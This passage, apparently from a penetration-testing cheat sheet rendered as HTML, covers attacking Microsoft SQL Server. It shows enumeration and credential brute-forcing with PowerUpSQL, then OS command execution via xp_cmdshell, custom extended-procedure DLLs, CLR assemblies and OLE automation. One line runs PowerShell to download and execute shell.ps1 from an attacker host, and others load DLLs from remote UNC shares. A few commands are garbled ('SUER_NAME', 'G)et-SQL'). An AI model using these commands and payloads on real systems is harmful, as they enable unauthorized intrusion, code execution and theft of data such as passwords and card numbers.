+<li>.NET (UDP Broadcast): <code class="codehilite"><span class="p">[</span><span class="k">System</span><span class="p">.</span><span class="k">Data</span><span class="p">.</span><span class="k">Sql</span><span class="p">.</span><span class="n">SqlDataSourceEnumeration</span><span class="p">]::</span><span class="n">Instance</span><span class="p">.</span><span class="n">GetDataSources</span><span class="p">()</span></code></li>
+</ul>
+</li>
+<li>Local Enumeration<ul>
+<li><a href="http://www.powershellmagazine.com/2014/07/21/using-powershell-to-discover-information-about-your-microsoft-sql-servers/">http://www.powershellmagazine.com/2014/07/21/using-powershell-to-discover-information-about-your-microsoft-sql-servers/</a>
+  <div class="codehilite"><pre><span></span><span class="nb">Import-Module</span> <span class="n">-Name</span> <span class="n">SQLPS</span>
+<span class="nb">Get-ChildItem</span> <span class="n">SQLSERVER</span><span class="err">:</span><span class="p">\</span><span class="n">SQL</span><span class="p">\&lt;</span><span class="n">machinename</span><span class="p">&gt;</span>
+</pre></div>
+  <div class="codehilite"><pre><span></span><span class="nb">Get-Service</span> <span class="n">-Name</span> <span class="n">MSSQL</span><span class="p">*</span>
+<span class="n">sqlinstances</span> <span class="p">=</span> <span class="nb">Get-ItemProperty</span> <span class="n">-Path</span> <span class="s1">&#39;HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server&#39;</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$SQLInstance</span> <span class="k">in</span> <span class="nv">$SQLInstances</span><span class="p">)</span> <span class="p">{</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$s</span> <span class="k">in</span> <span class="nv">$SQLInstance</span><span class="p">.</span><span class="n">InstalledInstances</span><span class="p">)</span> <span class="p">{</span> <span class="no">[PSCustomObject]</span><span class="p">@{</span> <span class="n">PSComputerName</span> <span class="p">=</span> <span class="nv">$SQLInstance</span><span class="p">.</span><span class="n">PSComputerName</span> <span class="n">InstanceName</span> <span class="p">=</span> <span class="nv">$s</span><span class="p">}}}</span>
+</pre></div>
+  <div class="codehilite"><pre><span></span><span class="nb">Get-SQLInstanceLocal</span>
+</pre></div></li>
+</ul>
+</li>
+<li>Domain Enumeration<ul>
+<li>Search AD user attribute: <code class="codehilite"><span class="n">servicePrincipalName</span><span class="o">=</span><span class="n">MSSQL</span><span class="o">*</span></code>
+  <div class="codehilite"><pre><span></span><span class="nb">Import-Module</span> <span class="n">-Name</span> <span class="n">PowerUpSQL</span>
+<span class="nb">Get-SQLInstanceDomain</span> <span class="n">-verbose</span>
+</pre></div></li>
+</ul>
+</li>
+<li>Looking for interesting databases
+    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLDatabaseThreaded</span> <span class="n">-Threads</span> <span class="n">10</span> <span class="n">-Username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-verbose</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-ExpandProperty</span> <span class="n">DatabaseName</span>
+</pre></div>
+    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLDatabaseThreaded</span> <span class="n">-Threads</span> <span class="n">10</span> <span class="n">-Username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">is_encrypted</span> <span class="o">-eq</span> <span class="err">“</span><span class="n">True</span><span class="s2">&quot;}</span>
+</pre></div>
+    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLColumnSampleDataThreaded</span> <span class="n">-Threads</span> <span class="n">10</span> <span class="n">-Keywords</span> <span class="s2">&quot;password, credit&quot;</span> <span class="n">-SampleSize</span> <span class="n">5</span> <span class="n">-ValidateCC</span> <span class="n">-NoDefaults</span> <span class="n">-Username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-Verbose</span>
+</pre></div></li>
+</ul>
+<h3 id="queries">Queries<a class="headerlink" href="#queries" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Version: <code class="codehilite"><span class="k">SELECT</span><span class="w"> </span><span class="nb">@@version</span><span class="w"></span></code></li>
+<li>Current User: <code class="codehilite"><span class="k">SELECT</span> <span class="n">SUSER_SNAME</span><span class="p">()</span></code> <code class="codehilite"><span class="k">SELECT</span> <span class="k">SYSTEM_USER</span></code></li>
+<li>Current Role: <code class="codehilite"><span class="k">SELECT</span> <span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">)</span></code> <code class="codehilite"><span class="k">SELECT</span> <span class="k">user</span></code></li>
+<li>Current Database: <code class="codehilite"><span class="k">SELECT</span> <span class="n">db_name</span><span class="p">()</span></code></li>
+<li>List All Databases: <code class="codehilite"><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">master</span><span class="p">..</span><span class="n">sysdatabases</span></code></li>
+<li>List All Logins: <code class="codehilite"><span class="k">SELECT</span> <span class="o">-</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">server_principals</span> <span class="k">WHERE</span> <span class="n">type_desc</span> <span class="o">!=</span> <span class="s1">&#39;SERVER_ROLE&#39;</span></code></li>
+<li>List All Users for Database: <code class="codehilite"><span class="k">SELECT</span> <span class="o">-</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">database_principals</span> <span class="k">WHERE</span> <span class="n">type_desc</span> <span class="o">!=</span> <span class="s1">&#39;DATABASE_ROLE&#39;</span></code></li>
+<li>List All Sysadmins: <code class="codehilite"><span class="k">SELECT</span> <span class="n">name</span><span class="p">,</span><span class="n">type_desc</span><span class="p">,</span><span class="n">is_disabled</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">server_principals</span> <span class="k">WHERE</span> <span class="n">IS_SRVROLEMEMBER</span> <span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">,</span><span class="n">name</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span></code></li>
+<li>List All Roles: 
+    <div class="codehilite"><pre><span></span><span class="k">SELECT</span> <span class="n">DP1</span><span class="p">.</span><span class="n">name</span> <span class="k">AS</span> <span class="n">DatabaseRoleName</span><span class="p">,</span> <span class="k">isnull</span> <span class="p">(</span><span class="n">DP2</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="s1">&#39;No members&#39;</span><span class="p">)</span> <span class="k">AS</span> <span class="n">DatabaseUserName</span>
+<span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">database_role_members</span> <span class="k">AS</span> <span class="n">DRM</span>
+<span class="k">RIGHT</span> <span class="k">OUTER</span> <span class="k">JOIN</span> <span class="n">sys</span><span class="p">.</span><span class="n">database_principals</span> <span class="k">AS</span> <span class="n">DP1</span> <span class="k">ON</span> <span class="n">DRM</span><span class="p">.</span><span class="n">role_principal_id</span> <span class="o">=</span> <span class="n">DP1</span><span class="p">.</span><span class="n">principal_id</span>
+<span class="k">LEFT</span> <span class="k">OUTER</span> <span class="k">JOIN</span> <span class="n">sys</span><span class="p">.</span><span class="n">database_principals</span> <span class="k">AS</span> <span class="n">DP2</span> <span class="k">ON</span> <span class="n">DRM</span><span class="p">.</span><span class="n">member_principal_id</span> <span class="o">=</span> <span class="n">DP2</span><span class="p">.</span><span class="n">principal_id</span>
+<span class="k">WHERE</span> <span class="n">DP1</span><span class="p">.</span><span class="k">type</span> <span class="o">=</span> <span class="s1">&#39;R&#39;</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="n">DP1</span><span class="p">.</span><span class="n">name</span><span class="p">;</span>
+</pre></div></li>
+<li>Effective Permissions for Server: <code class="codehilite"><span class="k">SELECT</span> <span class="o">-</span> <span class="k">FROM</span> <span class="n">fn_my_permissions</span><span class="p">(</span><span class="k">NULL</span><span class="p">,</span> <span class="s1">&#39;SERVER&#39;</span><span class="p">);</span></code></li>
+<li>Effective Permissions for Database: <code class="codehilite"><span class="k">SELECT</span> <span class="o">-</span> <span class="k">FROM</span> <span class="n">fn_my_permissions</span><span class="p">(</span><span class="k">NULL</span><span class="p">,</span> <span class="s1">&#39;DATABASE&#39;</span><span class="p">);</span></code></li>
+<li>Active User Tokens: <code class="codehilite"><span class="k">SELECT</span> <span class="o">-</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">user_token</span></code></li>
+<li>Active Login Tokens: <code class="codehilite"><span class="k">SELECT</span> <span class="o">-</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">login_token</span></code></li>
+<li>Impersonatable Accounts:
+    <div class="codehilite"><pre><span></span><span class="k">SELECT</span> <span class="k">distinct</span> <span class="n">b</span><span class="p">.</span><span class="n">name</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">server_permissions</span> <span class="n">a</span>
+<span class="k">INNER</span> <span class="k">JOIN</span> <span class="n">sys</span><span class="p">.</span><span class="n">server_principals</span> <span class="n">b</span> <span class="k">ON</span> <span class="n">a</span><span class="p">.</span><span class="n">grantor_principal_id</span> <span class="o">=</span> <span class="n">b</span><span class="p">.</span><span class="n">principal_id</span>
+<span class="k">WHERE</span> <span class="n">a</span><span class="p">.</span><span class="n">permission_name</span> <span class="o">=</span> <span class="s1">&#39;IMPERSONATE&#39;</span>
+</pre></div></li>
+<li>Find Trustworthy Databases:
+    <div class="codehilite"><pre><span></span><span class="k">SELECT</span> <span class="n">name</span> <span class="k">as</span> <span class="n">database_name</span><span class="p">,</span> <span class="n">SUSER_NAME</span><span class="p">(</span><span class="n">owner_sid</span><span class="p">)</span> <span class="k">AS</span> <span class="n">database_owner</span><span class="p">,</span> <span class="n">is_trustworthy_on</span> <span class="k">AS</span> <span class="n">TRUSTWORTHY</span>
+<span class="k">from</span> <span class="n">sys</span><span class="p">.</span><span class="n">databases</span>
+</pre></div></li>
+<li><a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-role-members-transact-sql">https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-role-members-transact-sql</a></li>
+</ul>
+<h2 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link">&para;</a></h2>
+<h3 id="brute-forcing">Brute-forcing<a class="headerlink" href="#brute-forcing" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Check if current domain user has access to DB
+    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLInstanceDomain</span> <span class="p">|</span> <span class="nb">Get-SQLConnectionTestThreaded</span> <span class="n">-Verbose</span>
+</pre></div></li>
+<li>Check if another domain user has access to DB
+    <div class="codehilite"><pre><span></span><span class="n">runas</span> <span class="p">/</span><span class="n">noprofile</span> <span class="p">/</span><span class="n">netonly</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="p">&lt;</span><span class="n">domain</span><span class="p">\</span><span class="n">username</span><span class="p">&gt;</span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span>
+<span class="nb">Get-SQLInstanceDomain</span> <span class="p">|</span> <span class="nb">Get-SQLConnectionTestThreaded</span> <span class="n">-Verbose</span>
+</pre></div></li>
+<li>Fuzzing logins:
+    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLFuzzServerLogin</span> <span class="n">-Instance</span> <span class="n">ops-mssql</span> <span class="err">–</span><span class="n">Verbose</span>
+</pre></div>
+    <div class="codehilite"><pre><span></span><span class="c1">-- Above is equivalent to:</span>
+<span class="k">SELECT</span> <span class="n">SUER_NAME</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">SELECT</span> <span class="n">SUER_NAME</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="k">SELECT</span> <span class="n">SUER_NAME</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+</pre></div></li>
+<li>BruteForce:
+    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLInstanceDomain</span> <span class="p">|</span> <span class="n">G</span><span class="p">)</span><span class="n">et-SQLConnectionTestThreaded</span> <span class="n">-Username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">Password</span> <span class="n">-Verbose</span>
+</pre></div>
+    <div class="codehilite"><pre><span></span><span class="nv">$comps</span> <span class="p">=</span> <span class="p">$(</span><span class="nb">Get-SQLInstanceDomain</span><span class="p">).</span><span class="n">ComputerName</span>
+<span class="n">comps</span> <span class="p">|</span> <span class="nb">Invoke-BruteForce</span> <span class="n">-UserList</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">dict</span><span class="p">\</span><span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="n">-PasswordList</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">dict</span><span class="p">\</span><span class="n">passwords</span><span class="p">.</span><span class="n">txt</span> <span class="n">-Service</span> <span class="n">SQL</span> <span class="err">–</span><span class="n">Verbose</span>
+</pre></div></li>
+</ul>
+<h3 id="command-execution">Command Execution<a class="headerlink" href="#command-execution" title="Permanent link">&para;</a></h3>
+<h4 id="xp_cmdshell">xp_cmdshell<a class="headerlink" href="#xp_cmdshell" title="Permanent link">&para;</a></h4>
+<ul>
+<li>Disabled by default since SQL Server 2005</li>
+<li>Executed with the privileges of SQL Server service account</li>
+<li>Synchronous</li>
+<li><code class="codehilite"><span class="n">sysadmin</span></code> privileges are required</li>
+<li>If uninstalled: <code class="codehilite"><span class="n">sp_addextendedproc</span> <span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span><span class="s1">&#39;xplog70.dll&#39;</span></code></li>
+<li>Execute command: <ul>
+<li><code class="codehilite"><span class="k">EXEC</span> <span class="nv">master</span>..<span class="nv">xp_cmdshell</span> <span class="s1">&#39;</span><span class="s">whoami</span><span class="s1">&#39;</span></code></li>
+<li><code class="codehilite"><span class="n">xp_cmdshell</span> <span class="n">powershell</span> <span class="n">iex</span><span class="p">(</span><span class="k">New</span><span class="o">-</span><span class="k">Object</span> <span class="k">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="err">\</span><span class="ss">&quot;http://10.10.14.8/shell.ps1\&quot;</span><span class="p">)</span></code></li>
+</ul>
+</li>
+<li>Enable xp_cmdshell: <code class="codehilite"><span class="n">mssqlclient</span><span class="p">.</span><span class="n">py</span></code> has <code class="codehilite"><span class="n">enable_xp_cmdshell</span></code>
+    <div class="codehilite"><pre><span></span><span class="k">exec</span> <span class="n">sp_configure</span> <span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span> <span class="mi">1</span>
+<span class="n">RECONFIGURE</span>
+<span class="k">exec</span> <span class="n">sp_configure</span> <span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span> <span class="mi">1</span>
+<span class="n">RECONFIGURE</span>
+</pre></div></li>
+<li>Disable xp_cmdshell
+    <div class="codehilite"><pre><span></span><span class="k">exec</span> <span class="n">sp_configure</span> <span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span>
+<span class="n">RECONFIGURE</span>
+<span class="k">exec</span> <span class="n">sp_configure</span> <span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span>
+<span class="n">RECONFIGURE</span>
+</pre></div></li>
+<li>Grant permissions to xp_cmdshell - Let's say we have a user that is not a sysadmin, but is a user of the master database and we nt to grant access to run xp_cmdshell:
+    <div class="codehilite"><pre><span></span><span class="c1">-- add user test to the master database</span>
+<span class="n">USE</span> <span class="p">[</span><span class="n">master</span><span class="p">]</span>
+<span class="k">GO</span>
+<span class="k">CREATE</span> <span class="k">USER</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span> <span class="k">FOR</span> <span class="n">LOGIN</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span>
+<span class="k">GO</span>
+<span class="c1">-- grant execute access to xp_cmdshell</span>
+<span class="k">GRANT</span> <span class="k">EXEC</span> <span class="k">ON</span> <span class="n">xp_cmdshell</span> <span class="k">TO</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span>
+</pre></div></li>
+<li>Nishang: <code class="codehilite"><span class="k">Execute</span><span class="o">-</span><span class="n">Command</span><span class="o">-</span><span class="n">MSSQL</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="n">instance</span> <span class="o">-</span><span class="n">UserName</span> <span class="n">sa</span> <span class="o">-</span><span class="n">Password</span> <span class="n">pw</span></code></li>
+<li>PowerUpSQL: <code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">SQLOSCmd</span> <span class="o">-</span><span class="n">Username</span> <span class="n">sa</span> <span class="o">-</span><span class="n">Password</span> <span class="n">pw</span> <span class="o">-</span><span class="n">Instance</span> <span class="n">instance</span> <span class="o">-</span><span class="n">Command</span> <span class="n">whoami</span></code></li>
+</ul>
+<h4 id="custom-extended-stored-procedures">Custom Extended Stored Procedures<a class="headerlink" href="#custom-extended-stored-procedures" title="Permanent link">&para;</a></h4>
+<ul>
+<li>DLL which acts as an extension to SQL server</li>
+<li><code class="codehilite"><span class="n">sysadmin</span></code> privileges are required to register</li>
+<li>Executes with the privileges of the service account</li>
+<li>DLL can have any file extension</li>
+<li>Can also be loaded from UNC path or Webdav</li>
+<li>Sample DLL Code:<ul>
+<li><a href="https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp">https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp</a></li>
+<li><a href="https://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extended-stored-procedure">https://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extended-stored-procedure</a></li>
+</ul>
+</li>
+<li>If <code class="codehilite"><span class="n">xp_calc</span><span class="p">.</span><span class="n">dll</span></code> has a function called <code class="codehilite"><span class="n">xp_calc</span></code>:\
+    <div class="codehilite"><pre><span></span><span class="n">sp_addextendedproc</span> <span class="s1">&#39;xp_calc&#39;</span><span class="p">,</span> <span class="s1">&#39;C:\mydll\xp_calc.dll&#39;</span>
+<span class="k">EXEC</span> <span class="n">xp_calc</span>
+<span class="n">sp_dropextendedproc</span> <span class="s1">&#39;xp_calc&#39;</span>
+</pre></div>
+    <div class="codehilite"><pre><span></span><span class="n">Create-SQLFileXpDll</span> <span class="n">-OutFile</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">fileserver</span><span class="p">\</span><span class="n">xp_calc</span><span class="p">.</span><span class="n">dll</span> <span class="n">-Command</span> <span class="s2">&quot;calc.exe&quot;</span> <span class="n">-ExportName</span> <span class="n">xp_calc</span>
+<span class="nb">Get-SQLQuery</span> <span class="n">-UserName</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-Query</span> <span class="s2">&quot;sp_addextendedproc &#39;xp_calc&#39;, &#39;\\192.168.15.2\fileserver\xp_calc.dll&#39;&quot;</span>
+<span class="nb">Get-SQLQuery</span> <span class="n">-UserName</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">Password1</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-Query</span> <span class="s2">&quot;EXEC xp_calc&quot;</span>
+</pre></div></li>
+<li>Listing existing Custom Extended Stored Procedures:
+    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLStoredProcedureXP</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-Verbose</span>
+</pre></div></li>
+</ul>
+<h4 id="custom-clr-assemblies">Custom CLR Assemblies<a class="headerlink" href="#custom-clr-assemblies" title="Permanent link">&para;</a></h4>
+<ul>
+<li>CLR (<code class="codehilite"><span class="n">Common</span> <span class="k">Language</span> <span class="n">Runtime</span></code>) is a run-time environment provided by the <code class="codehilite"><span class="na">.NET</span> <span class="no">framework</span></code></li>
+<li>SQL Server CLR integration allows writing stored procedures and other things by importing a DLL.</li>
+<li>CLR integration is off by default</li>
+<li><code class="codehilite"><span class="n">sysadmin</span></code> privileges are required by-default.</li>
+<li>Create assembly, alter assembly or <code class="codehilite"><span class="n">DDL_Admin</span></code> role can also use it.</li>
+<li>Execution takes place with privileges of the service account</li>
+<li>DLL can be loaded from a local path or a UNC path</li>
+<li>References<ul>
+<li><a href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integrationv">https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integrationv</a></li>
+<li><a href="https://blog.netspi.com/attacking-sql-server-clr-assemblies/">https://blog.netspi.com/attacking-sql-server-clr-assemblies/</a></li>
+</ul>
+</li>
+<li>Enable CLR:
+    <div class="codehilite"><pre><span></span><span class="n">use</span> <span class="n">msdb</span>
+<span class="k">GO</span>
+<span class="c1">-- Enable show advanced options on the server</span>
+<span class="n">sp_configure</span> <span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span><span class="mi">1</span>
+<span class="n">RECONFIGURE</span>
+<span class="k">GO</span>
+<span class="c1">-- Enable clr on the server</span>
+<span class="n">sp_configure</span> <span class="s1">&#39;clr enabled&#39;</span><span class="p">,</span><span class="mi">1</span>
+<span class="n">RECONFIGURE</span>
+<span class="k">GO</span>
+</pre></div></li>
+<li>Create DLL:
+    <div class="codehilite"><pre><span></span><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="err">\</span><span class="n">Framework64</span><span class="err">\</span><span class="n">v4</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">30319</span><span class="err">\</span><span class="n">csc</span><span class="p">.</span><span class="n">exe</span> <span class="o">/</span><span class="n">target</span><span class="p">:</span><span class="n">library</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">labuser</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">cmd_exec</span><span class="p">.</span><span class="n">cs</span>
+</pre></div>
+    <div class="codehilite"><pre><span></span><span class="n">Create-SQLFileCLRDll</span> <span class="n">-ProcedureName</span> <span class="s2">&quot;runcmd&quot;</span> <span class="n">-OutFile</span> <span class="n">runcmd</span> <span class="n">-OutDir</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">labuser</span><span class="p">\</span><span class="n">Desktop</span>
+</pre></div></li>
+<li>Import the assembly from file:
+    <div class="codehilite"><pre><span></span><span class="k">CREATE</span> <span class="n">ASSEMBLY</span> <span class="n">my_assembly</span> <span class="k">FROM</span> <span class="s1">&#39;\\192.168.15.2\fileserver\cmd_exec.dll&#39;</span> <span class="k">WITH</span> <span class="n">PERMISSION_SET</span> <span class="o">=</span> <span class="n">UNSAFE</span><span class="p">;</span>
+<span class="k">GO</span>
+</pre></div></li>
+<li>Import the assembly from string:
+    <div class="codehilite"><pre><span></span><span class="k">CREATE</span> <span class="n">ASSEMBLY</span> <span class="p">[</span><span class="n">NMfsa</span><span class="p">]</span> <span class="k">AUTHORIZATION</span> <span class="p">[</span><span class="n">dbo</span><span class="p">]</span> <span class="k">FROM</span> <span class="mi">0</span><span class="n">x4D5A90</span><span class="p">......</span>
+</pre></div></li>
+<li>Link the assembly to a stored procedure
+    <div class="codehilite"><pre><span></span><span class="k">CREATE</span> <span class="k">PROCEDURE</span> <span class="p">[</span><span class="n">dbo</span><span class="p">].[</span><span class="n">cmd_exec</span><span class="p">]</span> <span class="o">@</span><span class="n">execCommand</span> <span class="n">NVARCHAR</span> <span class="p">(</span><span class="mi">4000</span><span class="p">)</span> <span class="k">AS</span> <span class="k">EXTERNAL</span> <span class="n">NAME</span> <span class="p">[</span><span class="n">my_assembly</span><span class="p">].[</span><span class="n">StoredProcedures</span><span class="p">].[</span><span class="n">cmd_exec</span><span class="p">];</span>
+<span class="k">GO</span>
+</pre></div></li>
+<li>Execution:
+    <div class="codehilite"><pre><span></span><span class="n">cmd_exec</span> <span class="s1">&#39;whoami&#39;</span>
+</pre></div>
+    <div class="codehilite"><pre><span></span><span class="nb">Invoke-SQLOSCmdCLR</span> <span class="n">-Username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-Command</span> <span class="s2">&quot;whoami&quot;</span> <span class="n">-Verbose</span>
+</pre></div></li>
+<li>Cleanup:
+    <div class="codehilite"><pre><span></span><span class="k">DROP</span> <span class="k">PROCEDURE</span> <span class="n">cmd_exec</span>
+<span class="k">DROP</span> <span class="n">ASSEMBLY</span> <span class="n">my_assembly</span>
+</pre></div></li>
+<li>List all CLR assemblies:
+    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLStoredProcedureCLR</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-Verbose</span>
+</pre></div></li>
+</ul>
+<h4 id="ole-automation-procedure">OLE Automation Procedure<a class="headerlink" href="#ole-automation-procedure" title="Permanent link">&para;</a></h4>
+<ul>
+<li>Disabled by default</li>
+<li><code class="codehilite"><span class="n">sysadmin</span></code> privileges are required by-default.</li>
+<li>Execution takes place with privileges of the service account</li>
+<li>Execute privileges on <code class="codehilite"><span class="n">sp_OACreate</span></code> and <code class="codehilite"><span class="n">sp_OAMethod</span></code> can also be used for execution.</li>
+<li>References:<ul>
+<li><a href="https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option">https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option</a></li>
+</ul>
+</li>
+<li>Enabling:
+    <div class="codehilite"><pre><span></span><span class="n">sp_configure</span> <span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span>
+<span class="k">GO</span>
+<span class="n">RECONFIGURE</span><span class="p">;</span>
+<span class="k">GO</span>
+<span class="n">sp_configure</span> <span class="s1">&#39;Ole Automation Procedures&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span>
+<span class="k">GO</span>
+<span class="n">RECONFIGURE</span><span class="p">;</span>
+<span class="k">GO</span>
+</pre></div></li>
+<li>Execute:
+    <div class="codehilite"><pre><span></span><span class="k">DECLARE</span> <span class="o">@</span><span class="k">output</span> <span class="nb">INT</span>
+<span class="k">DECLARE</span> <span class="o">@</span><span class="n">ProgramToRun</span> <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span>
+<span class="k">SET</span> <span class="o">@</span><span class="n">ProgramToRun</span> <span class="o">=</span> <span class="s1">&#39;Run(&quot;calc.exe&quot;)&#39;</span>
+<span class="k">EXEC</span> <span class="n">sp_oacreate</span> <span class="s1">&#39;wScript.Shell&#39;</span><span class="p">,</span> <span class="o">@</span><span class="k">output</span> <span class="k">out</span>
+<span class="k">EXEC</span> <span class="n">sp_oamethod</span> <span class="o">@</span><span class="k">output</span><span class="p">,</span> <span class="o">@</span><span class="n">ProgramToRun</span>
+<span class="k">EXEC</span> <span class="n">sp_oadestroy</span> <span class="o">@</span><span class="k">output</span>
+</pre></div>
+    <div class="codehilite"><pre><span></span><span class="nb">Invoke-SQLOSCmdCLR</span> <span class="n">-Username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-Command</span> <span class="s2">&quot;whoami&quot;</span> <span class="n">-Verbose</span>
+</pre></div></li>
+<li>Example: Sets SecurityDescriptor of ftp.exe to everyone:<ul>
+<li><a href="https://malwaremusings.com/2013/04/10/a-look-at-some-ms-sql-attacks-overview/">https://malwaremusings.com/2013/04/10/a-look-at-some-ms-sql-attacks-overview/</a>
+  <div class="codehilite"><pre><span></span><span class="c1">-- Declare variables used to reference the objects</span>
+<span class="k">DECLARE</span> <span class="o">@</span><span class="n">objLocator</span> <span class="nb">int</span><span class="p">,</span><span class="o">@</span><span class="n">objWmi</span> <span class="nb">int</span><span class="p">,</span><span class="o">@</span><span class="n">objPermiss</span> <span class="nb">int</span><span class="p">,</span><span class="o">@</span><span class="n">objFull</span> <span class="nb">int</span><span class="p">;</span>
+
+<span class="c1">-- Create a WbemScripting.SWbemLocator object</span>
+<span class="k">EXEC</span> <span class="n">sp_OACreate</span> <span class="s1">&#39;WbemScripting.SWbemLocator&#39;</span><span class="p">,</span><span class="o">@</span><span class="n">objLocator</span> <span class="k">OUTPUT</span><span class="p">;</span>
+
+<span class="c1">-- Use the SWbemLocator object&#39;s ConnectServer() method to connect to the</span>
+<span class="c1">-- local WMI server. The connection will be to the &#39;root\cimv2&#39; namespace</span>
+<span class="k">EXEC</span> <span class="n">sp_OAMethod</span> <span class="o">@</span><span class="n">objLocator</span><span class="p">,</span>
+<span class="s1">&#39;ConnectServer&#39;</span><span class="p">,</span><span class="o">@</span><span class="n">objWmi</span> <span class="k">OUTPUT</span><span class="p">,</span><span class="s1">&#39;.&#39;</span><span class="p">,</span><span class="s1">&#39;root\cimv2&#39;</span><span class="p">;</span>
+
+<span class="c1">-- Retrieve an SWbemObject that represents the requested object</span>
+<span class="c1">-- In this case, a Win32_LogicalFileSecuritySetting object for &#39;ftp.exe&#39;</span>
+<span class="k">EXEC</span> <span class="n">sp_OAMethod</span> <span class="o">@</span><span class="n">objWmi</span><span class="p">,</span>
+<span class="s1">&#39;Get&#39;</span><span class="p">,</span><span class="o">@</span><span class="n">objPermiss</span> <span class="k">OUTPUT</span><span class="p">,</span>
